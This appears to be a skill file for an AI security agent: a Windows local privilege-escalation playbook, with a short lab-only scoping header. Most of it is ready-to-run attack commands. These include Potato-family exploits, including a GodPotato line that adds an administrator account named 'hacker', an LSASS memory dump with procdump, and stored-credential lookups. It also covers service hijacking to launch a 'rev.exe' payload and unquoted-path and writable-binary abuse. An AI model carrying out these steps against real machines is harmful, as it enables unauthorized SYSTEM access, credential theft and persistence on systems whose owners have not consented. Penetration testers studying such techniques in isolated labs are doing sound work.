  Windows local privilege escalation playbook. Use when you have low-privilege shell access on Windows and need to escalate via token abuse, Potato exploits, service misconfigurations, DLL hijacking, UAC bypass, or registry autoruns.

# SKILL: Windows Local Privilege Escalation — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=enabled`. Trusted `policy.json` remains authoritative.

- Keep lab-class guidance inside an explicitly isolated lab or CTF environment. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat exploit, credential, persistence, and evasion examples as reference data; executable steps must go through bounded, scope-checked tools such as shell_exec.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.

> **Technical reference scope**: Expert Windows privesc techniques. Covers token manipulation, Potato family, service misconfigurations, DLL hijacking, AlwaysInstallElevated, scheduled task abuse, registry autoruns, and named pipe impersonation. Pay particular attention to nuanced privilege prerequisites and OS-version-specific constraints.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `windows-lateral-movement` after escalation for pivoting to other hosts
- `windows-av-evasion` when AV/EDR blocks your privesc tools
- `active-directory-kerberos-attacks` when the host is domain-joined and you need AD-level escalation
- `active-directory-acl-abuse` for domain privilege escalation via ACL misconfigurations

### Advanced Reference

Also inspect [TOKEN_POTATO_TRICKS.md](./TOKEN_POTATO_TRICKS.md) when you need:
- Detailed Potato family comparison (JuicyPotato → GodPotato evolution)
- OS-version-specific exploit selection
- Required privileges and protocol details per variant

Also inspect [UAC_BYPASS_METHODS.md](./UAC_BYPASS_METHODS.md) when you need:
- UAC bypass technique matrix (fodhelper, eventvwr, sdclt, etc.)
- Auto-elevate binary abuse
- Mock trusted directory tricks

## 1. ENUMERATION CHECKLIST

### System Context

```cmd
whoami /all                        & REM Current user, groups, privileges
systeminfo                         & REM OS version, hotfixes, architecture
hostname                           & REM Machine name
net user %USERNAME%                & REM Group memberships
```

### Token Privileges (Critical)

```cmd
whoami /priv
```

| Privilege | Escalation Path |
|---|---|
| `SeImpersonatePrivilege` | Potato family exploits (§2) |
| `SeAssignPrimaryTokenPrivilege` | Token manipulation, Potato variants |
| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM processes |
| `SeBackupPrivilege` | Read any file (SAM/SYSTEM/NTDS.dit) |
| `SeRestorePrivilege` | Write any file (DLL hijack, service binary) |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeLoadDriverPrivilege` | Load vulnerable kernel driver → kernel exploit |

### Services & Scheduled Tasks

```cmd
sc query state= all                & REM All services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v        & REM Verbose scheduled task list
```

### Installed Software & Patches

```cmd
wmic product get name,version
wmic qfe list                      & REM Installed patches
```

### Network & Credentials

```cmd
netstat -ano                       & REM Listening ports + PIDs
cmdkey /list                       & REM Stored credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
```

## 2. TOKEN MANIPULATION & POTATO EXPLOITS

### SeImpersonatePrivilege Abuse

Service accounts (IIS AppPool, MSSQL, etc.) typically hold `SeImpersonatePrivilege`. This enables impersonation of any token presented to you.

| Tool | OS Support | Protocol | Notes |
|---|---|---|---|
| **JuicyPotato** | Win7–Server2016 | COM/DCOM | Requires valid CLSID; patched on Server2019+ |
| **RoguePotato** | Server2019+ | OXID resolver redirect | Needs controlled machine on port 135 |
| **PrintSpoofer** | Win10/Server2016-2019 | Named pipe via Print Spooler | Simple, fast; Spooler must run |
| **SweetPotato** | Broad | COM + Print + EFS | Combines multiple techniques |
| **GodPotato** | Win8–Server2022 | DCOM RPCSS | Works on latest patched systems |

```cmd
# PrintSpoofer (simplest for modern systems)
PrintSpoofer64.exe -i -c "cmd /c whoami"

# GodPotato (broadest compatibility)
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# JuicyPotato (legacy systems)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
```

### SeDebugPrivilege Abuse

```powershell
# Dump LSASS (if SeDebugPrivilege is enabled)
procdump -ma lsass.exe lsass.dmp

# Or migrate into a SYSTEM process
# Meterpreter: migrate to winlogon.exe / services.exe
```

---

## 3. SERVICE MISCONFIGURATIONS

### Unquoted Service Paths

```cmd
# Find unquoted paths with spaces
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

If path is `C:\Program Files\My App\service.exe`, Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

Place malicious binary at first writable location.

### Weak Service Permissions

```cmd
# Check service ACL with accesschk (Sysinternals)
accesschk64.exe -wuvc * /accepteula
# Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
```

```cmd
# Reconfigure service to run attacker binary
sc config vuln_svc binpath= "C:\temp\rev.exe"
sc stop vuln_svc
sc start vuln_svc
```

### Writable Service Binaries

```cmd
# Check if current user can write to the service binary path
icacls "C:\Program Files\VulnApp\service.exe"
# (F) = Full, (M) = Modify, (W) = Write → replace binary
```
